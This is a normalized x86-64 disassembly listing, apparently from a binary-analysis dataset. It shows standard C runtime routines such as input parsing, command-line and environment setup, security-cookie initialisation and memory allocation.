mov ecx esi
call sub_1800126e8
xor ecx ecx
cmp eax ecx
je r-xdata
cmp r13d 0x70
je r-xdata
neg rsi
mov [ rsp + 0x88 ] rsi
jmp r-xdata
movzx esi dil
mov ecx esi
call sub_1800126e8
xor ecx ecx
cmp eax ecx
je r-xdata
cmp r13d 0x70
je r-xdata
mov rsi [ rsp + 0x60 ]
mov ebx 0x1
mov r12b 0x25
add [ rsp + 0x39 ] bl
add rbp rbx
mov [ rsp + 0x50 ] rbp
jmp r-xdata
mov r9 [ rsp + 0xe0 ]
mov [ rsp + 0xb0 ] r9
jmp r-xdata
cmp edi 0x2b
jne r-xdata
mov rax [ rsp + 0x70 ]
mov rbx rbp
mov [ rax ] dil
jmp r-xdata
mov r13d 0x64
cmp r13d 0x6e
jne r-xdata
mov r11d 0x1
add rbx r11
cmp r15b dl
je r-xdata
cmp r13d 0x7b
jne r-xdata
cmp edi 0x9
jl r-xdata
mov r13d [ rsp + 0x34 ]
mov ebx [ rsp + 0x6c ]
add ebx r11d
cmp r13d 0x63
mov r13d [ rsp + 0x34 ]
mov [ rsp + 0x6c ] ebx
je r-xdata
mov r12d [ rsp + 0x44 ]
add r12d r15d
mov rcx rbp
mov [ rsp + 0x34 ] r12d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
cmp al 0x78
je r-xdata
mov r12d [ rsp + 0x34 ]
mov rbp [ rsp + 0x60 ]
add r12d r15d
mov rcx rbp
mov [ rsp + 0x34 ] r12d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
cmp eax edx
je r-xdata
mov al [ rbp ]
cmp al 0x5d
je r-xdata
mov r12b 0x5d
add rbp r11
mov [ rsp + 0xf3 ] 0x20
cmp [ rsp + 0x30 ] r15b
jne r-xdata
dec ebx
mov [ rsp + 0x34 ] ebx
cmp edi r14d
je r-xdata
mov eax [ rsp + 0x5c ]
mov ecx esi
movsx ebx dil
shl eax 0x4
mov [ rsp + 0x5c ] eax
call sub_180012668
mov esi [ rsp + 0x5c ]
mov edi ebx
xor ecx ecx
and edi 0xffffffdf
sub edi 0x7
cmp eax ecx
cmovne edi ebx
mov [ rsp + 0x3c ] edi
movzx ecx dil
call sub_180012668
xor ecx ecx
cmp eax ecx
je r-xdata
dec ebx
mov [ rsp + 0x34 ] ebx
cmp edi r14d
je r-xdata
shl [ rsp + 0x88 ] 0x4
mov ecx esi
movsx ebx dil
call sub_180012668
mov rsi [ rsp + 0x88 ]
mov edi ebx
and edi 0xffffffdf
xor ecx ecx
sub edi 0x7
cmp eax ecx
cmovne edi ebx
mov [ rsp + 0x3c ] edi
movzx ecx dil
call sub_180012668
xor ecx ecx
cmp eax ecx
je r-xdata
mov r12 [ rsp + 0x60 ]
mov r13d [ rsp + 0x34 ]
mov r12 [ rsp + 0x60 ]
mov r13d [ rsp + 0x34 ]
sub esi ebp
mov rcx r12
add r13d ebp
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
mov eax [ rsp + 0x68 ]
jmp r-xdata
mov eax [ rsp + 0x34 ]
xor r15d r15d
cmp cl r15b
je r-xdata
cmp [ rsp + 0x68 ] edx
je r-xdata
mov rax [ rsp + 0x98 ]
mov r11d 0x1
mov [ rax ] dil
add rax r11
mov [ rsp + 0x98 ] rax
jmp r-xdata
movzx ecx dil
mov [ rsp + 0x90 ] dil
call sub_180005804
test eax eax
je r-xdata
mov rax rdi
mov edx edi
sar rax 0x3
and edx 0x7
movsx ecx [ rsp + rax + 0xe8 ]
movsx eax r12b
xor ecx eax
bt ecx edx
jae r-xdata
cmp edi 0x20
jne r-xdata
cmp edi 0xd
jle r-xdata
xor r15d r15d
cmp r15b dl
je r-xdata
add r12d r15d
mov rcx rbp
mov [ rsp + 0x34 ] r12d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
xor eax eax
cmp [ rsp + 0x68 ] eax
je r-xdata
cmp al 0x58
je r-xdata
cmp edi 0x30
jne r-xdata
mov bl r15b
xor ebx ebx
cmp [ rbp ] bl
je r-xdata
xor r14d r14d
mov rbp [ rsp + 0x50 ]
mov r13d [ rsp + 0x34 ]
jmp r-xdata
inc [ rsp + 0x6c ]
mov eax [ rsp + 0x5c ]
jmp r-xdata
mov esi [ rsp + 0x5c ]
mov rdx r15
mov ecx edi
call sub_1800127ec
mov ebx [ rsp + 0x34 ]
add ebx ecx
mov rcx r15
mov [ rsp + 0x34 ] ebx
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
sub ebp ecx
je r-xdata
cmp r13d 0x6f
jne r-xdata
mov rsi [ rsp + 0x88 ]
mov rdx r15
mov ecx edi
call sub_1800127ec
mov ebx [ rsp + 0x34 ]
mov rcx r15
add ebx edx
mov [ rsp + 0x34 ] ebx
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
sub ebp edx
je r-xdata
cmp r13d 0x6f
jne r-xdata
call sub_180012668
cmp eax r15d
jne r-xdata
cmp eax r15d
movzx ecx dil
cmove esi r14d
mov [ rsp + 0x48 ] esi
jmp r-xdata
mov r12d [ rsp + 0x44 ]
mov rbp [ rsp + 0x50 ]
mov r13d eax
jmp r-xdata
mov ecx [ rsp + 0x34 ]
jmp r-xdata
mov eax 0x3f
lea r9 [ rsp + 0xc0 ]
lea rdx [ rsp + 0x90 ]
mov [ rsp + 0x78 ] ax
mov rax [ rsp + 0xc0 ]
lea rcx [ rsp + 0x78 ]
movsxd r8 [ rax + 0x10c ]
call sub_1800115f4
mov rax [ rsp + 0x98 ]
movzx r11d [ rsp + 0x78 ]
mov ecx [ rsp + 0x34 ]
mov [ rax ] r11w
add rax 0x2
mov [ rsp + 0x98 ] rax
mov r11d 0x1
jmp r-xdata
mov rcx [ rsp + 0x60 ]
inc [ rsp + 0x34 ]
call sub_18000d2c0
mov [ rsp + 0x91 ] al
xor r15d r15d
mov [ rax ] r15b
jmp r-xdata
xor r15d r15d
mov [ rax ] r15w
jmp r-xdata
mov r13d 0x78
jmp r-xdata
sub esi 0x2
cmp esi r15d
mov [ rsp + 0x48 ] esi
jge r-xdata
mov [ rsp + 0x4c ] r15d
cmp r13d 0x78
je r-xdata
mov eax 0x1
cmp [ rsp + 0x7c ] eax
jne r-xdata
jmp r-xdata
movzx r8d al
mov r12b al
movzx eax al
and eax 0x7
mov edx r11d
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 + 0xe8 ] dl
cmp r12b r14b
je r-xdata
mov rcx [ rsp + 0x98 ]
cmp r12d r15d
je r-xdata
cmp r13d 0x78
je r-xdata
lea eax [ rsi + rsi * 4 ]
lea esi [ rax + rax ]
jmp r-xdata
cmp edi 0x38
jge r-xdata
cmp r13d 0x78
je r-xdata
lea rsi [ rsi + rsi * 4 ]
add rsi rsi
jmp r-xdata
cmp edi 0x38
jge r-xdata
mov eax esi
sub esi ebp
mov [ rsp + 0x48 ] esi
cmp eax r15d
je r-xdata
mov rax [ rsp + 0xc0 ]
mov ebp [ rsp + 0x48 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov ecx 0x1
mov sil [ rax ]
cmp sil dil
jne r-xdata
mov rbp [ rsp + 0x50 ]
mov r13d [ rsp + 0x34 ]
cmp [ rsp + 0x38 ] r15b
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rcx ] rax
xor edx edx
add bl r15b
sub r12d r15d
mov [ rsp + 0x34 ] r12d
cmp eax r14d
je r-xdata
xor eax eax
cmp [ rsp + 0x68 ] eax
je r-xdata
add rbp r11
cmp al 0x2d
jne r-xdata
or r14d 0xffffffff
mov cl [ rbp ]
cmp cl 0x5d
je r-xdata
mov ecx 0x1
lea esi [ rsi + rdi - 0x30 ]
xor eax eax
add [ rsp + 0x4c ] ecx
mov [ rsp + 0x5c ] esi
cmp [ rsp + 0x68 ] eax
je r-xdata
shl esi 0x3
jmp r-xdata
lea eax [ rdi - 0x30 ]
mov edx 0x1
add [ rsp + 0x4c ] edx
movsxd rcx eax
xor eax eax
add rsi rcx
mov [ rsp + 0x88 ] rsi
cmp [ rsp + 0x68 ] eax
je r-xdata
shl rsi 0x3
jmp r-xdata
mov rax [ rsp + 0x70 ]
add [ rsp + 0x4c ] ebp
lea r9 [ rsp + 0x110 ]
mov [ rbx + rax ] dil
lea rax [ rsp + 0x7c ]
add rbx rbp
lea r8 [ rsp + 0x70 ]
lea rdx [ rsp + 0xa0 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000d228
cmp eax r15d
je r-xdata
mov esi [ rsp + 0x4c ]
cmp esi r15d
je r-xdata
mov eax ebp
sub ebp ecx
cmp eax r15d
je r-xdata
mov [ rcx ] ax
jmp r-xdata
mov [ rcx ] eax
jmp r-xdata
mov edi 0x30
mov [ rsp + 0x3c ] edi
jmp r-xdata
mov rdx rbp
mov ecx eax
call sub_1800127ec
mov r13d 0x6f
sub esi r15d
mov [ rsp + 0x48 ] esi
jne r-xdata
add rbp r11
cmp r12b cl
jae r-xdata
mov rcx r12
add r13d ebp
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
movzx ecx al
mov eax 0x1
sub r13d eax
mov [ rsp + 0x34 ] r13d
cmp edi r14d
je r-xdata
cmp edi 0x65
je r-xdata
add r13d ecx
mov rcx r12
call sub_18000d2c0
lea r9 [ rsp + 0x110 ]
lea r8 [ rsp + 0x70 ]
mov edi eax
mov [ rsp + 0x3c ] eax
mov rax [ rsp + 0x70 ]
mov [ rbx + rax ] sil
lea rax [ rsp + 0x7c ]
inc rbx
lea rdx [ rsp + 0xa0 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000d228
cmp eax r15d
je r-xdata
add bl r15b
mov r9b r12b
mov r12b cl
mov r9b cl
jmp r-xdata
cmp esi r15d
je r-xdata
mov rdx r12
mov ecx edi
call sub_1800127ec
mov eax 0x1
mov eax ebp
sub ebp ecx
cmp eax r15d
je r-xdata
cmp edi 0x45
jne r-xdata
movzx ecx dil
mov r12b r14b
jmp r-xdata
movzx r10d r12b
cmp r12b r9b
ja r-xdata
cmp [ rsp + 0x30 ] r15b
jne r-xdata
mov rax [ rsp + 0x70 ]
lea r9 [ rsp + 0x110 ]
lea r8 [ rsp + 0x70 ]
mov [ rbx + rax ] 0x65
add rbx rcx
lea rax [ rsp + 0x7c ]
lea rdx [ rsp + 0xa0 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000d228
cmp eax r15d
je r-xdata
mov eax ebp
sub ebp ecx
cmp eax r15d
je r-xdata
mov al [ rbp ]
cmp al 0x5d
jne r-xdata
movzx eax r12b
mov r8 r10
mov edx r11d
and eax 0x7
shr r8 0x3
add r12b r11b
mov cl al
add r10 r11
shl dl cl
or [ rsp + r8 + 0xe8 ] dl
cmp r12b r9b
jbe r-xdata
mov rbp [ rsp + 0x50 ]
jmp r-xdata
mov rsi [ rsp + 0x70 ]
add [ rsp + 0x6c ] eax
mov [ rbx + rsi ] r15b
movsx ebx [ rsp + 0x38 ]
mov rcx [ rw-data ]
sub ebx eax
call DecodePointer
mov rdx [ rsp + 0x98 ]
lea r9 [ rsp + 0xc0 ]
mov r8 rsi
mov ecx ebx
call rax
mov rcx r12
inc r13d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
cmp eax 0x2d
jne r-xdata
mov rax [ rsp + 0x70 ]
add [ rsp + 0x4c ] ecx
lea r9 [ rsp + 0x110 ]
mov [ rbx + rax ] dil
add rbx rcx
lea rax [ rsp + 0x7c ]
lea r8 [ rsp + 0x70 ]
lea rdx [ rsp + 0xa0 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000d228
cmp eax r15d
je r-xdata
cmp eax 0x2b
jne r-xdata
mov rax [ rsp + 0x70 ]
lea r9 [ rsp + 0x110 ]
lea r8 [ rsp + 0x70 ]
mov [ rbx + rax ] dil
lea rax [ rsp + 0x7c ]
inc rbx
lea rdx [ rsp + 0xa0 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000d228
cmp eax r15d
je r-xdata
mov rcx r12
inc r13d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
movzx ecx al
jmp r-xdata
movzx ecx dil
jmp r-xdata
mov eax ebp
mov ecx 0x1
sub ebp ecx
cmp eax r15d
jne r-xdata
jmp r-xdata
call sub_180012668
mov ecx 0x1
cmp eax r15d
je r-xdata
call sub_180012668
cmp eax r15d
jne r-xdata
add r13d ecx
mov rcx r12
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
mov ebp r15d
jmp r-xdata
mov eax ebp
mov ecx 0x1
sub ebp ecx
cmp eax r15d
je r-xdata
mov rax [ rsp + 0x70 ]
add esi ecx
lea r9 [ rsp + 0x110 ]
mov [ rbx + rax ] dil
add rbx rcx
lea rax [ rsp + 0x7c ]
lea r8 [ rsp + 0x70 ]
lea rdx [ rsp + 0xa0 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000d228
cmp eax r15d
je r-xdata
mov rcx r12
inc r13d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
movzx ecx al
sub_18000e468
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rbx [ rw-data ]
xor edi edi
test rbx rbx
jne r-xdata
call sub_18000c8d4
mov al [ rbx ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_180006b3c
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_18000d180
lea rbx [ rbx + rax + 0x1 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_180004690
and [ rw-data ] 0x0
and [ rdi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_18000d180
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
add rbx rax
cmp [ rbx ] 0x0
jne r-xdata
movsxd rbp esi
mov edx 0x1
mov rcx rbp
call sub_180006b3c
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_180004690
and [ rw-data ] 0x0
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_18000f628
test eax eax
je r-xdata
add rdi 0x8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
sub_18000e598
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 [ rsp + 0x60 ]
mov r14 r9
mov rdi r8
and [ r13 ] 0x0
mov r12 rdx
mov rbx rcx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
xor ebp ebp
mov [ rdx ] r8
add r12 0x8
inc [ r13 ]
test rdi rdi
je r-xdata
xor eax eax
test ebp ebp
mov sil 0x22
sete al
inc rbx
mov ebp eax
jmp r-xdata
movzx esi [ rbx ]
inc rbx
mov ecx esi
call sub_180012984
test eax eax
je r-xdata
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test ebp ebp
jne r-xdata
test sil sil
je r-xdata
inc [ r13 ]
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
dec rbx
inc rbx
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r12 r12
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
xor esi esi
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
inc [ r14 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
and [ r12 ] 0x0
inc rbx
jmp r-xdata
cmp [ rbx ] 0x9
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r12 r12
je r-xdata
inc [ r14 ]
mov [ r12 ] rdi
add r12 0x8
cmp [ rbx ] 0x5c
je r-xdata
inc rbx
inc ecx
cmp [ rbx ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test dl cl
jne r-xdata
dec ecx
test rdi rdi
je r-xdata
mov al [ rbx ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ r13 ]
mov [ rdi ] 0x5c
inc rdi
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
lea rax [ rbx + 0x1 ]
cmp [ rax ] 0x22
jne r-xdata
inc [ r13 ]
jmp r-xdata
mov [ rdi ] 0x0
inc rdi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
inc rbx
jmp r-xdata
movsx ecx al
call sub_180012984
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
mov edx 0x1
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ r13 ]
inc rbx
inc [ r13 ]
mov al [ rbx ]
mov [ rdi ] al
inc rdi
jmp r-xdata
mov al [ rbx ]
inc rbx
mov [ rdi ] al
inc rdi
inc [ r13 ]
sub_18000e768
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_18000c8d4
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
or eax 0xffffffff
movsxd rcx [ rsp + 0x48 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000e598
movsxd rsi [ rsp + 0x40 ]
mov rcx 0x1fffffffffffffff
cmp rsi rcx
jae r-xdata
lea rdx [ rcx + rsi * 8 ]
cmp rdx rcx
jb r-xdata
mov rcx rdx
call sub_180006ad0
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000e598
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18000e860
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
mov ecx [ rw-data ]
xor r12d r12d
mov rbx r12
lea esi [ r12 + 0x2 ]
cmp ecx r12d
jne r-xdata
cmp ecx 0x1
jne r-xdata
call [ GetEnvironmentStringsW@IAT ]
mov rbx rax
cmp rax r12
je r-xdata
cmp ecx esi
je r-xdata
cmp rbx r12
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
cmp eax 0x78
cmove ecx esi
mov [ rw-data ] ecx
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov rbx rax
cmp rax r12
je r-xdata
cmp ecx r12d
jne r-xdata
mov rdi rbx
cmp [ rbx ] r12w
je r-xdata
call [ GetEnvironmentStringsW@IAT ]
mov rbx rax
cmp rax r12
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rax ] r12b
je r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
sub rdi rbx
sar rdi 0x1
mov r8 rbx
xor edx edx
lea r9d [ rdi + 0x1 ]
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
cmp ebp r12d
je r-xdata
add rdi rsi
cmp [ rdi ] r12w
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub eax ebx
inc eax
movsxd rsi eax
mov rcx rsi
call sub_180006ad0
mov rdi rax
cmp rax r12
jne r-xdata
inc rax
cmp [ rax ] r12b
jne r-xdata
mov rsi r12
mov rcx rbp
call sub_180006ad0
mov rsi rax
cmp rax r12
je r-xdata
add rdi rsi
cmp [ rdi ] r12w
jne r-xdata
mov r8 rsi
mov rdx rbx
mov rcx rax
call sub_1800059c0
mov rcx rbx
call [ FreeEnvironmentStringsA@IAT ]
mov rax rdi
mov rcx rbx
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc rax
cmp [ rax ] r12b
jne r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rdi + 0x1 ]
mov r8 rbx
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
cmp eax r12d
jne r-xdata
mov rcx rbx
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
jmp r-xdata
mov rcx rsi
call sub_180004690
sub_18000ea14
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_18000ea4c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_18000ea88
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_18000682c
xor r11d r11d
mov rbx rax
cmp rax r11
je r-xdata
xor eax eax
mov rcx [ rax + 0xa0 ]
movsxd r8 [ rw-data ]
mov rdx rcx
mov rax r8
shl rax 0x4
add rax rcx
cmp rdx rax
jae r-xdata
mov rax r8
add rdx 0x10
shl rax 0x4
add rax rcx
cmp rdx rax
jb r-xdata
mov rdx r11
cmp [ rdx ] edi
je r-xdata
cmp [ rdx ] edi
je r-xdata
mov r8 [ rdx + 0x8 ]
cmp r8 r11
je r-xdata
cmp rdx r11
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rdx + 0x8 ] r11
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
mov ecx [ rdx + 0x4 ]
cmp ecx 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rdx + 0x8 ] r11
call r8
movsxd r10 [ rw-data ]
mov ecx [ rw-data ]
add ecx r10d
mov r9 r10
cmp r10d ecx
jge r-xdata
cmp [ rdx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
shl r9 0x4
cmp [ rdx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
mov rax [ rbx + 0xa0 ]
inc r10d
add r9 0x10
mov [ r9 + rax - 0x8 ] r11
mov ecx [ rw-data ]
mov eax [ rw-data ]
add ecx eax
cmp r10d ecx
jl r-xdata
cmp [ rdx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rdx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rdx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rdx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rdx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
mov [ rbx + 0xb0 ] 0x8a
sub_18000ec78
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18000ed34
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0xc
call sub_180008530
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180007638
test eax eax
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_18000ede4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor edi edi
mov rbx rdx
mov rsi rcx
test rdx rdx
je r-xdata
imul rbx r8
test rcx rcx
je r-xdata
xor edx edx
lea rax [ rdi - 0x20 ]
div rbx
cmp rax r8
jae r-xdata
mov rdx rbx
mov rcx rsi
call sub_18000450c
mov rsi rax
test rax rax
je r-xdata
call sub_180006cd0
mov rdi rax
call sub_1800075a8
and [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0xc
call sub_180008530
xor eax eax
jmp r-xdata
mov rax rsi
cmp rdi rbx
jae r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub rbx rdi
lea rcx [ rdi + rax ]
xor edx edx
mov r8 rbx
call sub_180009540
sub_18000ee80
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call EncodePointer
mov [ rbx ] rax
add rbx 0x8
sub rdi 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000eec0
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_18000eef0
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_18000ef40
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_18000eec0
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_18000eef0
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
